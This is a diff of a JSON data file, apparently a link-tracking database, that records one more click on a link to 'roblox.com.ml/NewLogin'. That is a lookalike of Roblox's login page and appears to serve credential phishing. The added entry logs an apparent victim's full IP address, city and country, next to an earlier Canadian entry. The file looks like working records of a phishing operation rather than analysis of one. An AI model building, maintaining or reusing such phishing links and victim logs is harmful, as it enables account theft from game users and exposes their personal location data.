@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 210,
+    "useCount": 211,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1792,6 +1792,14 @@
         "city": "Richmond Hill",
         "flag": "🇨🇦",
         "countryCode": "CA"
+      },
+      {
+        "timestamp": 1776976528665,
+        "ip": "181.132.34.96",
+        "country": "Colombia",
+        "city": "Bogotá",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
